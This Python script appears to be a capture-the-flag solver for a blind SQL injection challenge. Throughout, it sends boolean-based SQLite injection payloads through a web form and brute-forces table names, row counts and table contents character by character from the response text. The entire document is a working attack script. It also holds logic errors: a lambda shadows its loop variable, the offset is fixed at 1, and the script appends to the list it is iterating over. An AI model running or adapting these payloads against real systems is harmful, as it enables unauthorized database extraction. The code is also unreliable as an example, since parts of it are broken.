from Helpers import *
from Brute import *
import requests

TARGET_URL = 'https://blindsqli-web.chall.cryptonite.team'


def checkChar(i, ch, j):
    try:
        payload = f"1' or '1'=='1' and (SELECT hex(substr(tbl_name,{i+1},1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset {j})=hex('{ch}') -- "
        data = {
            "query": payload,
            "sub": "Submit"
        }
        res = requests.post(f"{TARGET_URL}/", data=data)
        if res.text.count("Hell yeah we got one, come visit us") > 0:
            return True
    except:
        return False

    return False

def checkChar2(i, ch, j, tbl_name):
    try:
        payload = f"1' or '1'=='1' and (SELECT hex(substr(sql,{i+1},1)) FROM {tbl_name} limit 1 offset {j})=hex('{ch}') -- "
        data = {
            "query": payload,
            "sub": "Submit"
        }
        res = requests.post(f"{TARGET_URL}/", data=data)
        if res.text.count("Hell yeah we got one, come visit us") > 0:
            return True
    except:
        return False

    return False

def checkLen2(l,i,tbl_name):
    payload = f"1' or '1'=='1' and (SELECT length(sql) FROM {tbl_name} limit 1 offset {i})={l} -- "
    data = {
        "query": payload,
        "sub": "Submit"
    }
    res = requests.post(f"{TARGET_URL}/", data=data)
    if res.text.count("Hell yeah we got one, come visit us") > 0:
        return True
    return False

def checkNum2(l,tbl_name):
    payload = f"1' or '1'=='1' and (SELECT count(sql) FROM {tbl_name})={l} -- "
    data = {
        "query": payload,
        "sub": "Submit"
    }
    res = requests.post(f"{TARGET_URL}/", data=data)
    if res.text.count("Hell yeah we got one, come visit us") > 0:
        return True
    return False

def checkLen(l,i):
    payload = f"1' or '1'=='1' and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset {i})={l} -- "
    data = {
        "query": payload,
        "sub": "Submit"
    }
    res = requests.post(f"{TARGET_URL}/", data=data)
    if res.text.count("Hell yeah we got one, come visit us") > 0:
        return True
    return False

def checkNum(l):
    payload = f"1' or '1'=='1' and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%')={l} -- "
    data = {
        "query": payload,
        "sub": "Submit"
    }
    res = requests.post(f"{TARGET_URL}/", data=data)
    if res.text.count("Hell yeah we got one, come visit us") > 0:
        return True
    return False


def Main():
    l=0
    while(checkNum(l)!=True):
        l+=1
    
    tables=[]
    for i in range(0,l):
        options = Helpers.getOptions()
        options['checkChar'] = lambda i,ch: checkChar(i, ch, 1)
        options['checkLen'] = lambda l: checkLen(l, 1)
        brute = Brute(**options)
        flag = brute.run(5)
        tables.append(flag)
        print(flag)

    for i in tables:
        j=0
        while(checkNum2(j,i)!=True):
            j+=1
        options = Helpers.getOptions()
        options['checkChar'] = lambda i,ch: checkChar2(i, ch, 1,i)
        options['checkLen'] = lambda l: checkLen2(l, 1,i)
        brute = Brute(**options)
        flag = brute.run(5)
        tables.append(flag)
        print(flag)

    # for functions where you need more than given inputs, use lambda functions
    # Eg - options['checkLen']=lambda i: getFlagLength(i,x)


Main()
